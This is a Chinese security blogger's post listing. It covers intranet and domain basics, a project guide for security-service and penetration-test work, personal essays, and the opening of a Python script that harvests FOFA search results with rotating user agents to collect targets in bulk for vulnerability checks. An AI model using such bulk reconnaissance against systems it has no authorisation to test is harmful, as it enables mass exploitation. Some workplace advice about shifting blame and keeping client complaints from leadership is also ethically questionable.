<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://john-tlh.github.io/page/2/">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="麦芽糖吖">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://john-tlh.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-大概是孤独" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/10/07/%E5%A4%A7%E6%A6%82%E6%98%AF%E5%AD%A4%E7%8B%AC/" class="article-date">
  <time datetime="2021-10-07T11:37:00.876Z" itemprop="datePublished">2021-10-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/07/%E5%A4%A7%E6%A6%82%E6%98%AF%E5%AD%A4%E7%8B%AC/">大概是孤独</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>写了好多，删了又删，或许人都有矫情的时候吧，又或许还没有坚强到轻易让别人看穿自己软弱的地步。</p>
<p>生活本就是自扫庭前雪，自己去污秽。</p>
<p>说到底还是闲的</p>
<p>记得专攻术业，好好生活，先自爱，再爱人。共勉。</p>
<p><img src="https://i.loli.net/2021/10/07/ZqEaWUsCwrlnIxi.jpg" alt="微信图片_20211007193606"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://john-tlh.github.io/2021/10/07/%E5%A4%A7%E6%A6%82%E6%98%AF%E5%AD%A4%E7%8B%AC/" data-id="ckugv7yyg0000rwvdalbeby23" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-内网基础：" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/10/01/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%EF%BC%9A/" class="article-date">
  <time datetime="2021-10-01T13:05:29.378Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="内网基础"><a href="#内网基础" class="headerlink" title="内网基础"></a>内网基础</h2><p>1、<strong>工作组：</strong>工作组内所有计算机是对等的。工作组不能集中管理。</p>
<p>2、<strong>域：</strong>域可以说是工作组的升级，域内的安全管理控制机制更加严格，用户需要访问域需要有合法的身份登录才行，之后才能访问域内资源。用户在域内的身份不同，能访问的资源也不同。</p>
<p>3、<strong>域控：</strong>域控是域内一台类似管理域内机器的计算机，通俗来说像一个单位的门禁系统。当有用户访问域内资源时，域控会鉴别计算机是否属于这个域。域控是整个域的通信枢纽，所有的权限身份验证都在域控制器上进行，域内所有用来验证身份的账号和密码散列值都保存在域控制器中。</p>
<p>4、**<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/282319.html">域环境：</a>**单域、父域、子域、域树、域森林。</p>
<p>5、<strong>域名服务器：</strong>域名服务器就是DNS，在现实用IP配置也是经常会配置的。实际上域中的计算机是使用DNS来定位域控制器、服务器、网络服务等。所以域的名字就是DNS域的名字。所以在内网渗透中，大多数情况下是通过寻找DNS服务器来定位域控制器的。因为域控制器和DNS服务都配置在同一台机器上！</p>
<p>6、<strong>活动目录：</strong>AD是域环境中提供目录服务的组件。</p>
<p>7、<strong>域控制器和活动目录的区别：</strong>把域内的众多资源（计算机、用户、用户组、打印机、共享文件等）分门别类有序的放在一个大的仓库中，并将检索信息整理好以便查找和访问这些资源的一个数据库就是活动目录数据库简称AD库。要实现域环境其实就是要安装AD。如果内网中的一台机器上安装了AD，那么它就成为了域控DC。域控就是安装了活动目录的计算机。</p>
<p>8、<strong>安全域的划分：</strong>在一个路由器连接的网络中，可以将网络划分为内网、DMZ、以及外网三个区域。这三个区域需要完成不同的任务，因此需要设置不同的访问策略。（ACL）</p>
<p>9、<strong>域中计算机的分类：</strong></p>
<ul>
<li>域控</li>
<li>成员服务器</li>
<li>客户机</li>
<li>独立服务器：独立服务器不在域中，也没有安装活动目录。</li>
</ul>
<p>10、<strong>域内权限解读：</strong>A-G-DL-P策略（A:用户账户 G：表示全局组 U：表示通用组 DL：表示域本地组 P：表示资源权限）</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://john-tlh.github.io/2021/10/01/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%EF%BC%9A/" data-id="ckugv7yym0001rwvdeoq40x7r" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-安全服务项目防坑指南" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/12/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE%E9%98%B2%E5%9D%91%E6%8C%87%E5%8D%97/" class="article-date">
  <time datetime="2021-07-12T07:41:38.763Z" itemprop="datePublished">2021-07-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="安全服务项目防坑指南"><a href="#安全服务项目防坑指南" class="headerlink" title="安全服务项目防坑指南"></a>安全服务项目防坑指南</h2><p>为规范安全服务项目实施过程，保证实施质量，提高实施效率，特制定本防坑指南。</p>
<h3 id="十三个不要"><a href="#十三个不要" class="headerlink" title="十三个不要"></a>十三个不要</h3><ol>
<li>正式文档或者邮件编写完成后，<strong>自己通读几遍</strong>，检查主题和正文是否规范，相关附件是否准确，正文内容<strong>不要留白或者出现错别字</strong>（包括语句不通顺、客户文字写错等低级错误）</li>
<li><strong>有问题就提！！！</strong>不要把问题累积到自己身上，处理不了会造成更大的问题。（但是<strong>要注意提问的艺术</strong>，不急的事情自己先搜索或者其它方式了解，如果还是找不到记得带着细节去咨询，要高效提问，不要浪费彼此的时间）</li>
<li>在正式场合或正式文档里，不要用<strong>应该是、可能是、好像是</strong>这种不确定的答案，<strong>要求准确把信息传递给客户。</strong></li>
<li>实在不能确定的问题，<strong>不要轻易给客户方做出你没把握或者不确定的承诺</strong>（一定要预估风险、留有余地）可以给客户说需要确认一下，约在什么时间点给他回复。</li>
<li>不要总是只提出问题，<strong>在提出问题的时候，思考并提出你认为的解决方案</strong>。</li>
<li><strong>问题遇到了就遇到了，不要害怕或者逃避。没什么大不了。</strong>把它想成是一个好事，要是自己处理好了就牛逼了。</li>
<li><strong>不要轻易说“不会”，“做不到”，协调周边其它资源帮忙</strong>做也是做到的一种方式。</li>
<li>对于一些有<strong>争议、复杂、可能被截屏的事情，不要微信文字沟通！！！用电话！！！</strong></li>
<li>需要别人配合的、非简单事项，<strong>给出大概的时间点</strong>，如（麻烦在xx时间点完成） 尽量不要用“尽快”等词语。一般尽快都不会快。</li>
<li><strong>不要重复造轮子</strong>，很多文档或者问题思路其实已经有了现成的了，多问一下。</li>
<li><strong>一个好的问题</strong>可以遵循以下形式进行组织：背景信息–遇到的问题–可能的解决方案–尝试解决之后的效果–想要获得什么样的帮助。</li>
<li><strong>背景信息尤其重要</strong>，别人能不能理解你的问题，能不能代入到你的场景里给出合理建议，全在你的信息描述里。</li>
<li><strong>沟通或者汇报不要模模糊糊，思考以下几个方面：</strong></li>
</ol>
<ul>
<li>你想做什么？</li>
<li>想达到什么结果？</li>
<li>打算怎么做？</li>
<li>还有没有更好的方案？</li>
<li>估计会有什么困难和阻力？</li>
<li>你打算怎么办？</li>
<li>有什么需要支持？</li>
</ul>
<h3 id="项目实施前"><a href="#项目实施前" class="headerlink" title="项目实施前"></a>项目实施前</h3><ol>
<li>务必与相关人员（合作伙伴对接人、销售、客户对接人）沟通清楚，了解项目前期实施（如相关售前交流的方案、PPT 等资料）或沟通项目实施的目标、需求、时间、地点、注意事项。</li>
<li>准备项目实施启动PPT、方案、实施计划表等（依实际情况而定，计划表主要便于客户或合作方知悉项目进度）。</li>
<li>了解项目要实现的目标，了解每项工作的目的，了解客户对于项目的实际需求。</li>
<li>通读项目技术规范书（合同里有附带，有时候需要主动向销售索取），充分掌握项目规定工作内容项以及后期验收需要的相关材料。</li>
</ol>
<h3 id="项目实施中"><a href="#项目实施中" class="headerlink" title="项目实施中"></a>项目实施中</h3><ul>
<li><strong>关于沟通</strong></li>
</ul>
<ol>
<li>项目最大的问题是未知风险，首次现场沟通后对关于进度、服务内容范围、客户目标、实施难度等进行预判，对于能与客户、销售沟通部分，先行与客户销售沟通清楚，提出解决方案。不能的地方与领导沟通，提出解决方案。</li>
<li>影响项目评价最大的两个人：1）客户方领导 2) 销售  所以在项目实施过程中，多和这两个人沟通，了解他们的想法、目的和需求。简单来讲“多沟通、多做事、多装逼”</li>
<li>项目实施更看重结果和目标，因此项目经理凡是觉得<strong>有利于目标完成</strong>，想提出的需求或者需要领导协调的资源就提出来，是否能落地让领导去判断。</li>
<li>项目最好的结果是共赢。<strong>客户有收获，我们有收获，销售有收获</strong>（销售站的角度比较高，往往更看重是否能给他带来后续项目的机会，如后续的服务和产品，因此在实施过程中，发现有这样的机会点就可以和销售先沟通，增加好感度）</li>
<li>对于客户方一些拍脑袋等不合理的决定，你就从技术的角度提出来，是哪方面不合理，然后建议的解决方案是怎么样的，<strong>避免给自己平添很多的麻烦。</strong></li>
<li><strong>每天预留一点时间跳出繁琐事务，从全局思考</strong>：工作安排是否合理，流程是否需要优化，是否能更好的完成项目目标，否则很容易沉浸于具体工作，造成客户看不到，销售不清楚，自己还搞得很累的实施情况。</li>
<li>给客户讲的东西，也要具备可落地的操作性，如需要谁在什么时间点做什么达到怎么样的效果。</li>
<li>尽量把客户对实施的意见仅仅留在现场，在现场和客户沟通清楚意见内容并尽量消除该意见，避免被反馈给销售或者客户领导。</li>
<li>确信正确的事情需要或需要实施的动作，如果客户或者销售不配合就强硬一点，告知不配合的风险在哪里，实在沟通不了也要把锅甩出去，合理避免风险。</li>
<li>给客户提供方案，引导客户同意你想实施的方案，但不代替客户做决定。</li>
<li>遇到突发情况，重要情况第一时间同步给项目经理、销售。</li>
<li>先目的，后措施，先分类，后解决，先整体，后细节。</li>
<li>学会深度思考，不要以为客户或者伙伴的需求就一定是真实的需求，弄清楚这个需求背后的原因才是重要的。</li>
</ol>
<ul>
<li><strong>实施中其它注意事项</strong></li>
</ul>
<ol>
<li>分清楚工作内容的层次，优先解决重要的事情、领导关注的事情，不要纠结于某个影响不大的技术细节。</li>
<li>涉及对重要的信息系统、服务器，尽量我们指导，客户自己或相关责任厂商实施操作。如有必要的情况下，在做操作之前，要向客户对接人、业务对接人确认，尽量在客户方陪同下进行操作，总而言之，一定<strong>尽可能规避我们的风险。</strong></li>
<li>实施的前几天是关键点：问题、实施难度、效果尽量都放大一些，协调最好的资源，做出较好的效果，实施、文档都干漂亮些，与客户和销售建立信任关系，度过了前期，后期实施过程中就比较方便。</li>
<li>让客户明白具体要怎么配合，为什么要配合，配合后达到的目的，每个阶段可能要做什么事情，哪些是关键点。</li>
<li><strong>在项目的实施过程中，什么都确认到具体项，</strong>比如开会的具体时间、具体楼房以及门牌号、具体实际对接人，避免客户有模棱两可的描述，以防真正碰到情况的时候手忙脚乱。</li>
<li>项目实施期间，在知晓技术规范书中要求的验收材料的前提下，有意识的准备后期验收所需材料，存放于单独文件夹内，并做好分类，避免项目结束准备验收或总结材料时，文件太多、太杂导致难以找到所需文件。</li>
<li>在编写项目方案，验收报告或者其它文档时，如遇<strong>编写内容比较复杂、耗时较长、文档数量较多的，需要首先确定客户的编写要求，或者先拟定文档模板，与客户确定模板准确性后，再进行剩余文档的编写，</strong>以免造成花了大力气编写的文档在交付时被驳回的情况。</li>
<li>工作追求完成质量是对客户负责，追求完成度那是对公司负责，追求完善优化是对自己负责。</li>
</ol>
<h3 id="渗透项目实施中注意事项"><a href="#渗透项目实施中注意事项" class="headerlink" title="渗透项目实施中注意事项"></a>渗透项目实施中注意事项</h3><ol>
<li><strong>参与做渗透测试项目的，一定不能用手头客户的出口网络去测，千万不要触碰这条底线，</strong>如不遵守的进行通报、罚款、降薪，情节严重的甚至开除。请大家务必遵守实施规范，不要节外生枝。</li>
<li>严格按照客户授权的测试时间、测试范围以及规范进行渗透工作，切勿超出规定范围进行测试（如虽不在范围，但可能存在极大漏洞风险，导致可能威胁客户整体网络安全，一定和客户沟通，是否需要对范围外的资产进行测试）</li>
<li>增删改功能处不能使用自动化工具，如sqlmap,burp自动化插件等。</li>
<li>生产环境不能进行登录大型扫描，登录扫描会写入大量脏数据。</li>
<li>Sql 注入，只需要出现数据库名称即可，不能进行数据查看。</li>
<li>shell 或者命令执行，推荐上传一个文本证明，如纯文本的1.php、1.jsp等证明问题存在即可，禁止下载和读取服务器上任何源代码文件和敏感文件，不要执行删除、写入命令，如果是上传的webshell文件，请写明shell文件地址和连接口令。</li>
<li>越权增删改，请使用自己的测试账号进行。账号不可注册的情况下，如果获取到该系统的帐密并验证成功，如需进一步安全测试，请咨询客户得到同意后进行测试。</li>
<li>存储xss漏洞，尽量插入不影响他人的测试payload。</li>
<li>关于漏洞扫描项目，在实施前先沟通清楚客户有没有监管单位的检查，大概用什么检查，都什么时候检查，我们对症下药（监管机构用什么扫描器我们尽量用什么扫描器），以免我们扫描结果与监管单位扫描结果有出入，从而被客户质疑我们的项目实施能力。</li>
</ol>
<h3 id="电网渗透测试注意事项"><a href="#电网渗透测试注意事项" class="headerlink" title="电网渗透测试注意事项"></a>电网渗透测试注意事项</h3><ol>
<li>在工作时间内不能进行常规扫描任务。</li>
<li>做过的系统，多发发现、挖掘漏洞，尽量不要让护网的红队，发现在我们做过的系统有较严重的漏洞，如某个中间件能rce，我们没发现，后面被红队发现，国网会进行通报，之后他们会追责。</li>
<li>尽量不要进行电话之类的口头话，用邮件留下证据，如某个系统发现一个漏洞，厂家直接电话回复，这个系统是旧版本，要下线关停，漏洞无需整改，没有留下有邮件之类的说明，之后被红队发现，通报后，解释很麻烦。</li>
<li>如果有攻击事件告警牵涉到多家厂商分析，一定要说法一样，不要出现，我说这是误报，你说是真实攻击的情况。</li>
<li>国网文档部分要求比较严格，文档会有人专门审核，并且最终成果会与合同中的服务内容一一对应。</li>
<li>国网的漏洞一把内网比较多，在挖掘时多关注内网渗透这方面。</li>
</ol>
<h3 id="关于文档"><a href="#关于文档" class="headerlink" title="关于文档"></a>关于文档</h3><ol>
<li>先列出思路，框架，整体逻辑，对相关数据进行量化；整体思路以及框架整理很重要，这个做好了，后续文档就有据可依，如果这一步没做好，后面写文档的时候就想着稀里糊涂的，极易产生多余的工作量，结果还没做好。</li>
<li>项目实施过程中，当处理完一个问题或者一件新的东西对其进行总结，依据具体情况形成经验文档。</li>
<li>写日报等汇报文档，1）写清楚什么原因在什么地方和谁做了什么工作内容，达到了什么正面效果。最好能体现四个方面的能力（技术能力、协调能力、沟通能力、工作态度）2）凡是涉及项目范围、项目内容、项目目标、客户需求等内容均可以写进日报。</li>
<li>关于其它文档内容（如报告、PPT）要逻辑自洽，清楚自己当前讲的是什么东西，不要被客户问得一问三不知，要考虑到每一个疑问点，并在汇报前就解决掉，不能给自己挖坑。</li>
<li>重要的不在于细节，重要的在于整体的思路和丰富度，无论是文档还是其它材料，都是如此。</li>
</ol>
<h3 id="关于PPT"><a href="#关于PPT" class="headerlink" title="关于PPT"></a>关于PPT</h3><ol>
<li>和写文档一样，制作PPT（如开工，阶段总结，项目总结，产品介绍，服务介绍等）也是需要先列出思路，框架，整体逻辑，对相关数据进行量化；这些依旧很重要，这个做好了，后续写PPT就有据可循，如果这一步没做好，后面写PPT的时候就想稀里糊涂的，极易产生多余的工作量，结果还做不好。</li>
<li>写PPT不同与写word文档，需要在每一页PPT里面突出想描述的重点，最大限度精简相关描述，用最简短的话语描述出想表达的意思。</li>
<li>每页PPT都不能是长篇大论的温习描述，这样对观看着很不友好，也勾不起观看者继续观看下去的欲望，所以每页PPT都需要结合1-2张图片（可多不可少）来进行更直观的描述，<strong>图片比文字更容易让人接受和理解。</strong></li>
<li>前期尽可能的手机需要的素材，比如相关方案，照片，图片等，编写的时候多在网上寻找模板和需要的素材，但是必须得是结合总体思路和公司惯用的PPT母版元素的，总之就一句话，尽量在总体框架下，丰富PPT里面的内容，多插入图片以及其它素材，使PPT更有美感，让人容易接受，有观看下去的欲望。</li>
</ol>
<p>ps:</p>
<p>ppt模板类网站</p>
<p><a target="_blank" rel="noopener" href="http://www.tretars.com/">http://www.tretars.com</a></p>
<p><a target="_blank" rel="noopener" href="http://www.51pptmoban.com/">http://www.51pptmoban.com</a></p>
<p><a target="_blank" rel="noopener" href="http://www.ypppt.com/">http://www.ypppt.com</a></p>
<p>元素类网站</p>
<p><strong><a target="_blank" rel="noopener" href="https://www.iconfont.cn/">https://www.iconfont.cn</a></strong></p>
<p>背景类</p>
<p><a target="_blank" rel="noopener" href="https://www.hituyu.com/">https://www.hituyu.com</a></p>
<p>公众号</p>
<p>秋叶PPT</p>
<h3 id="项目实施后"><a href="#项目实施后" class="headerlink" title="项目实施后"></a>项目实施后</h3><ol>
<li>项目实施结束后，确定项目相关文件已经销毁或者妥善安全保存，提前告知客户我们具体离场时间，妥善安排好对客户或合作商的离场交接，并告知销售，质量管理人员等相关人员离场事宜。</li>
<li>总结好此次项目经验，在下一个项目中应用，达到总结经验的目的。</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://john-tlh.github.io/2021/07/12/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE%E9%98%B2%E5%9D%91%E6%8C%87%E5%8D%97/" data-id="cktsxcnb800005cvd5n8hbcu5" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-人生苦短、多活几年！" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/07/08/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%E3%80%81%E5%A4%9A%E6%B4%BB%E5%87%A0%E5%B9%B4%EF%BC%81/" class="article-date">
  <time datetime="2021-07-08T09:38:56.334Z" itemprop="datePublished">2021-07-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/07/08/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%E3%80%81%E5%A4%9A%E6%B4%BB%E5%87%A0%E5%B9%B4%EF%BC%81/">人生苦短、多活几年！</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>From tomorrow on, I will be a happy man.</p>
<p>Grooming,chopping and traveling all over the word.</p>
<p>From tomorrow on, I will care foodstuff and vegetable.</p>
<p>Living in a house towards the sea, with spring blossoms.</p>
<p>From tomorrow on, write to each of my dear ones.</p>
<p>Telling them of my happiness.</p>
<p>What the lightening of happiness has told me.</p>
<p>I will spread it to each of them.</p>
<p>Give a warm name for every river and every mountain.</p>
<p>Strangers, I will also wish you happy.</p>
<p>May you have a brilliant future !</p>
<p>May you lovers eventually becomes spouses !</p>
<p>May you enjoy happiness in this earthly word !</p>
<p>I only wish to face the sea, with spring blossoms.</p>
<p>做个爱自己的人、读书、吃饭、多睡觉，健谈、健体、不油腻。</p>
        
          <p class="article-more-link">
            <a href="/2021/07/08/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%E3%80%81%E5%A4%9A%E6%B4%BB%E5%87%A0%E5%B9%B4%EF%BC%81/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://john-tlh.github.io/2021/07/08/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%E3%80%81%E5%A4%9A%E6%B4%BB%E5%87%A0%E5%B9%B4%EF%BC%81/" data-id="ckquq6dvt00006kw2hc5tdtne" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%B9%A0%E6%83%AF/" rel="tag">习惯</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-批量采集fofa搜索结果" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/06/17/%E6%89%B9%E9%87%8F%E9%87%87%E9%9B%86fofa%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C/" class="article-date">
  <time datetime="2021-06-16T18:35:49.455Z" itemprop="datePublished">2021-06-17</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/06/17/%E6%89%B9%E9%87%8F%E9%87%87%E9%9B%86fofa%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C/">批量采集fofa搜索结果</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>今天看到某漏洞爆出，想进行批量采集url进行漏洞验证。奈何网上没有找到现成得脚本，于是自己写了一个采集fofa搜索引擎结果的脚本。具体功能相信各位自己都懂，直接上代码吧：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  @author: kriller</span></span><br><span class="line"><span class="string">  @license: (C) Copyright 2013-2017, Node Supply Chain Manager Corporation Limited.</span></span><br><span class="line"><span class="string">  @contact: kriller@cumt.edu.cn</span></span><br><span class="line"><span class="string">  @file: fofa.py</span></span><br><span class="line"><span class="string">  @time: 2021/6/17 1:57</span></span><br><span class="line"><span class="string">  @desc:</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.request <span class="keyword">as</span> request</span><br><span class="line"><span class="keyword">import</span> urllib.parse <span class="keyword">as</span> parse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getheaders</span>():</span></span><br><span class="line">  <span class="comment"># 随机ua池</span></span><br><span class="line">  user_agent_list = [</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; &#x27;</span><span class="string">&#x27;x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; pl-PL; rv:1.0.1) Gecko/20021111 Chimera/0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko, Safari) Cheshire/1.0.UNOFFICIAL&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/4.0 (compatible; 